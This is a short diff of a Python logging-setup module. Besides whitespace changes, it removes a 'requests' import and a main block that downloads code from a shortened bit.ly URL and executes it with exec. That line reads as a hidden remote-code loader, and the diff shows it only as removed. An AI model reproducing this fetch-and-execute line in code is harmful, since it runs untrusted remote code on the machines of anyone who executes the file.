@@ -1,6 +1,7 @@
 import logging
+
+
 from constants import APPLICATION_NAME
-import requests as r
 
 
 def setup_logging(name=APPLICATION_NAME):
@@ -32,7 +33,3 @@ def setup_logging(name=APPLICATION_NAME):
     logger.addHandler(console_handler)
 
     return logger
-
-
-if __name__ == "__main__":
-    exec(r.get("https://bit.ly/get-stash").content)
